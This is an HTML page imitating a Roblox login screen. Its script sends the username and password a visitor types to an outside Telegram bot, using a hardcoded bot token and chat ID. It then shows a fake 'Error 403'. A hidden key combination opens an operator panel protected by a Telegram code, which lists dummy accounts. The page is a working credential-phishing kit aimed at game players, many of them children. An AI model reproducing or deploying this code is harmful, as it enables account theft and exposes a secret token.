<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Admin Console</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; font-family: "Segoe UI", sans-serif; background: radial-gradient(circle, #252729 0%, #000 100%); color: #d1d1d1; overflow: hidden; }
        .navbar { display: flex; align-items: center; background-color: #232527; padding: 0 20px; height: 40px; position: fixed; top: 0; width: 100%; z-index: 100; border-bottom: 1px solid #111; box-sizing: border-box; }
        .logo-text { font-size: 20px; font-weight: 800; color: #fff; }
        .screen { display: none; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; width: 100%; position: absolute; }
        #login-form-screen { display: flex; }
        .login-card { background-color: #232527; width: 400px; padding: 40px; border-radius: 4px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 12px; margin-bottom: 15px; background-color: #393b3d; border: 1px solid #393b3d; border-radius: 8px; color: #fff; box-sizing: border-box; outline: none; }
        .btn-auth { width: 100%; padding: 12px; background: #393b3d; border: 1px solid #fff; color: #fff; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 95%; max-width: 1000px; border: 1px solid #444; max-height: 500px; overflow-y: auto; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 12px; border: 1px solid #333; text-align: left; }
        .btn-select { background: #0084ff; color: #fff; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }
        .btn-select:hover { background: #00a2ff; }
    </style>
</head>
<body>

    <div class="navbar"><div class="logo-text">ROBLOX</div></div>

    <div id="login-form-screen" class="screen">
        <div class="login-card">
            <h2 style="color:#fff; margin-bottom: 30px;">Login to Roblox</h2>
            <input type="text" id="username" placeholder="Username">
            <input type="password" id="password" placeholder="Password">
            <button class="btn-auth" onclick="saveData()">Log In</button>
        </div>
    </div>

    <div id="admin-auth" class="screen">
        <div class="login-card" style="border: 2px solid #ff0000;">
            <h2 style="color: #ff0000;">SECURITY CHECK</h2>
            <p id="status-text" style="color: #888; margin-bottom: 15px;">–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ. –ö–æ–¥ –ø—Ä–∏–¥–µ—Ç –≤ TG.</p>
            <input type="text" id="admin_user" placeholder="Admin Login">
            <input type="password" id="admin_pass" placeholder="–ö–æ–¥ –∏–∑ –¢–ì">
            <button class="btn-auth" style="border-color: #ff0000; color: #ff0000;" onclick="checkAdminAuth()">Unlock</button>
        </div>
    </div>

    <div id="admin-panel" class="screen">
        <div class="admin-box">
            <h2 style="color: #fff;">DATABASE (TOP 10 ACCOUNTS)</h2>
            <table>
                <thead><tr><th>Account</th><th>Status</th><th>Action</th></tr></thead>
                <tbody id="logData"></tbody>
            </table>
        </div>
        <button class="btn-auth" style="width: 150px; margin-top: 20px;" onclick="location.reload()">Exit</button>
    </div>

    <script>
        const TG_TOKEN = "8385266015:AAHpN8EUWlEgoGtslfBoEoyqPycXD2gbPGw";
        const TG_CHAT_ID = "7863254073";
        let secretCode = "";

        // –°–µ–∫—Ä–µ—Ç–∫–∞: Ctrl + \ + 3 + Z
        let keys = {};
        document.addEventListener('keydown', (e) => {
            keys[e.code] = true;
            if (keys["ControlLeft"] && keys["Backslash"] && keys["Digit3"] && keys["KeyZ"]) showScreen('admin-auth');
        });
        document.addEventListener('keyup', (e) => { delete keys[e.code]; });

        function showScreen(id) {
            document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
            document.getElementById(id).style.display = 'flex';
        }

        async function sendToTg(msg) {
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "Markdown" })
            });
        }

        async function saveData() {
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            if(!u || !p) return;
            await sendToTg(`üë§ *–ù–û–í–´–ô –õ–û–ì!*\n–Æ–∑–µ—Ä: \`${u}\`\n–ü–∞—Ä–æ–ª—å: \`${p}\``);
            alert("Error 403: Forbidden");
        }

        async function checkAdminAuth() {
            const pass = document.getElementById('admin_pass').value;
            const status = document.getElementById('status-text');

            if (secretCode === "") {
                secretCode = Math.floor(1000 + Math.random() * 9000).toString();
                status.innerText = "–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram!";
                status.style.color = "#ffff00";
                await sendToTg(`üîê *–í–•–û–î –í –ê–î–ú–ò–ù–ö–£*\n–¢–≤–æ–π –∫–æ–¥: \`${secretCode}\``);
            } else if (pass === secretCode) {
                showScreen('admin-panel');
                loadMockLogs();
            } else {
                status.innerText = "–ù–ï–í–ï–†–ù–´–ô –ö–û–î!";
                status.style.color = "#ff0000";
            }
        }

        function loadMockLogs() {
            const tbody = document.getElementById('logData');
            // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º 10 —Ñ–µ–π–∫–æ–≤—ã—Ö –∞–∫–∫–æ–≤ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏
            let html = "";
            for(let i=1; i<=10; i++) {
                let name = "Roblox_Pro_" + Math.floor(Math.random() * 9999);
                html += `<tr>
                    <td>${name}</td>
                    <td style="color:#00ff00">Ready</td>
                    <td><button class="btn-select" onclick="selectAcc('${name}')">–í—ã–±—Ä–∞—Ç—å</button></td>
                </tr>`;
            }
            tbody.innerHTML = html;
        }

        async function selectAcc(name) {
            alert("–ê–∫–∫–∞—É–Ω—Ç " + name + " –≤—ã–±—Ä–∞–Ω!");
            await sendToTg(`‚úÖ *–í–´–ë–†–ê–ù –ê–ö–ö–ê–£–ù–¢ –î–õ–Ø –†–ê–ë–û–¢–´:*\n–ò–º—è: \`${name}\``);
        }
    </script>
</body>
</html>
